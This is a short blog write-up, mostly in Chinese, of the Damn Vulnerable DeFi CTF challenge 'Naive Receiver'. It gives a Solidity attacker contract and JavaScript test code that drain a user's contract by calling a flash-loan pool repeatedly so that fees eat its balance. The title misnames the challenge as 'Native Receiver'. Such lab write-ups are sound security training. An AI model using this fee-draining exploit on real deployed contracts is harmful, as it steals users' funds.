---
layout: post
title: Damn Vulnerable DeFi - 2. Native Receiver
date:  2022-12-12
tags:  solidity ethereum
---

## Description
> There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.<br /><br />
You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.<br /><br />
Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)<br /><br />
- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0/contracts/naive-receiver)

## Writeup
呼叫 `flashLoan` function 可以使可以減少 1ETH，所以我們來寫個合約調用它，直到沒有餘額。
1. 撰寫合約
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    import "../naive-receiver/NaiveReceiverLenderPool.sol";

    contract NaiveReceiverAttacker {
      NaiveReceiverLenderPool private pool;

      constructor(address payable poolAddress) {
          pool = NaiveReceiverLenderPool(poolAddress);
      }

      function attack(address payable receiver) public {
        while(receiver.balance > 0) {
            pool.flashLoan(receiver, 0);
        }
      }
    }
    ```
2. 修改 `test/unstoppable/naive-receiver.challenge.js`
    ``` js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */   
        const attackerContract = await (await ethers.getContractFactory('NaiveReceiverAttacker', attacker)).deploy(this.pool.address);
        await attackerContract.connect(attacker).attack(this.receiver.address);
    });
    ```
3. `yarn run naive-receiver` to exploit !          

### 其他解法
不另外寫合約，直接修改 `test/unstoppable/naive-receiver.challenge.js` 成下面這樣也可以。
``` js
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */   
    for (let i = 0; i < 10; i++) {
        await this.pool.flashLoan(this.receiver.address, 0);
    }
});
```